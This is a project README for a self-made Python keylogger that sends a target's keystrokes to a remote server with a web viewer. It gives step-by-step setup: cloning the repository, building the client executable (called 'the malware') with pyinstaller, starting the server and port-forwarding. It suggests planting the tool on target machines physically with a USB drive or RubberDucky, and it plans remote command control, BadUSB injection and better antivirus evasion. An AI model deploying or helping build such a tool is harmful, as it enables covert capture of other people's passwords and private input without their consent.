# Keylogger

A keylogger made to send keystrokes to a remote server for it to then be accessed from a web interface.

There are many things to work on including mainly reliability but I am overall pretty happy with it. Dont expect some kind of crazy UI or functions, this is really bare bones and I made it for the sole purpose of leveling up my python skills. I also found the idea really neat and coudlnt find a good alternative ... so I made my own one.

It all started when I was looking into botnets and how to make my own one, but I quickly found out that the only ones that I had access to (at the time) was BYOB and Covenant. BYOB was outdated, was a pain to set up, didnt work and the comunity also gave up after trying to consult my problem in the discord. Covenant did work really nicely (when setting up) tho it was lacking features BYOB had and didnt work for me. So I decided to start with a keylogger. I (probbably) will make more of these tools like this keylogger and eventually will put it into a one big interface. But that has years to come since I still need to finish high school. :/

I will be updating this project and here are things you should be stayed tuned for:
* More reliable and secure connection and transfer
* Two way interactions (so you can write, modify, send commands to the targets for them to then behave like that (Ex. Stop for 15 min))
* Having a BadUSB payload to inject the malware
* Better UI (in desperate need please someone could help me I barely know HTML)
* Improved its under-the-radar ability (windows updates in the future may brick it)


## What will you need:

You will need:
* Linux server (RPI2 works well enough)
* Central computer (Your personal just for setting up)
* Internet connection (Preferably wired)
* Ability to port forward (Ik but there isnt a better way right now)

Optional:
* USB flash drive (To load your keylogger onto a target machine physicaly)
* USB RubberDucky (Also an option instead of a flash drive)
* Third PC (If you can it is recomended to test everything out)   

## How to set up:
* SSH into the server of your choice. (Can be done on windows but is made for linux)
* Run this command:
```
git clone https://github.com/Gablak/keylogger
```
* After that cd into:
```
cd keylogger/Server
```
* Here you have an installme script. Everything has been tested only with python 3.12 but it might work on newer versions. Run the installme by doing:
```
python3.12 installme.py
```
* It will prompt you for an IP address. This is going to be the IP of the server. By typing "auto" it will automaticaly get your public IP or you can type your own one if you want to test it out on a LAN netwok.
```
auto
```
* After that you cd out:
```
cd ..
```
* Cd into:
```
cd Client
```
* Here we will create the executable. If you do "ls" you can see there is target.py. Thats the "malware". To make it executable type:
```
pyinstaller --onefile --windowed target.py
```
* Wait till it finishes and you will have a bunch of files and directories. Cd into:
```
cd dist
```
* Here is your .exe file. Download it using filezila or your usb onto your PC. After that do:
```
cd ..
cd ..
cd Server
```
* Now type "ls". You will be able to see a few things but the most important are:
* start.sh    - for starting the server and the web UI
* stop.sh     - for killing both of the processes
* check.sh    - for checking the state of the server and the UI
```
./start.sh
```
* Now you are all set and running. Just execute the .exe and see if its working!
* Also go to this website for the UI:
```
http://192.168.XX.XXX:3500/
```
* Basicaly the local IP of the server.
* after that you will log into your router and port forward the ports 3500 and 4500.
## Things to keep in mind:

This isnt a full version and might not be working for you or your antivirus blocking it but its supposed to be a small project. 
